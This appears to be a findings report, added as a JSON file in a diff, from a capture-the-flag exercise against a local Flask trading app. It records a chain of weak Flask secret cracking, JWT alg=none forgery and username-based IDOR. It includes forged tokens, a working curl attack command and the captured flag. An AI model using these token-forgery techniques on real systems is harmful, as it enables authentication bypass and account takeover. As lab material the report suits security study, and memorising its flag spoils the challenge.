@@ -1,0 +1,27 @@
+{
+  "meta": {
+    "created": "2026-04-13T12:22:03.666123+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "012303b8-1ac9-4485-8449-b734bf77440f",
+      "timestamp": "2026-04-13T12:22:03.666014+00:00",
+      "title": "CTF Flag Extracted via Flask Secret Key Crack + JWT alg=none Bypass + IDOR",
+      "severity": "critical",
+      "target": "http://172.17.0.1:48157",
+      "description": "Chained vulnerabilities to access the 'flag' user's dashboard:\n1. Flask SECRET_KEY is 'your_secret_key' (weak, in wordlist) - cracked with flask-unsign\n2. JWT library accepts alg=none (no signature verification) - forged JWT bypasses auth\n3. IDOR: discovered flag user (user_id=10019) via username enumeration on /password/<username>\n4. Forged Flask session with user_id=10019 (flag user) using cracked Flask secret\n5. Combined forged Flask session + alg=none JWT with username=flag, user_id=10019 to access flag user dashboard\n\nLogin flow: POST / {username} -> /password/<username> -> /dashboard. Username 'flag' exists with user_id=10019.",
+      "evidence": "FLAG: flag{795a8930-4d69-4e12-9bf0-d6dad2f990d6}\n\nForged Flask session: eyJ1c2VyX2lkIjoxMDAxOX0.adzflw.9Eqc0Oj3VLFgyWC1EaEqww8_94c\nAlg=none JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImZsYWciLCJ1c2VyX2lkIjoxMDAxOSwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.\n\nDashboard response: Welcome, Flag flag{795a8930-4d69-4e12-9bf0-d6dad2f990d6}\n\nAttack command:\ncurl http://172.17.0.1:48157/dashboard -H 'Cookie: session=eyJ1c2VyX2lkIjoxMDAxOX0.adzflw.9Eqc0Oj3VLFgyWC1EaEqww8_94c; auth_token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImZsYWciLCJ1c2VyX2lkIjoxMDAxOSwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.'",
+      "tool_used": "flask-unsign, manual JWT forgery",
+      "cve": ""
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "ff3a8372-2ddb-44cd-af54-3f9551cbda19",
+      "timestamp": "2026-04-13T12:22:26.097629+00:00",
+      "title": "Trading Platform Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser / Attacker\"] --> Login[\"POST / Login Step 1\"]\n  Login --> PasswordForm[\"GET /password/username\"]\n  PasswordForm --> PasswordSubmit[\"POST /password/username\"]\n  PasswordSubmit --> Dashboard[\"GET /dashboard\"]\n  Dashboard --> Logout[\"POST /logout\"]\n  Login --> DB[(\"SQLite DB\\nusers table\\nuser_id, username, password\")]\n  PasswordSubmit --> DB\n  PasswordSubmit --> JWT[\"JWT auth_token cookie\\n{username, user_id, user_type}\"]\n  PasswordSubmit --> FlaskSession[\"Flask session cookie\\n{user_id}\"]\n  Dashboard --> JWT\n  Dashboard --> FlaskSession\n  VULN1[\"VULN 1: Weak Flask secret\\n'your_secret_key'\"] --> FlaskSession\n  VULN2[\"VULN 2: JWT alg=none accepted\"] --> JWT\n  VULN3[\"VULN 3: Username IDOR\\n/password/flag reveals\\nuser_id=10019\"] --> PasswordForm\n  FlagUser[\"Flag User\\nuser_id=10019\\nflag{795a8930...}\"] --> Dashboard"
+    }
+  ]
+}
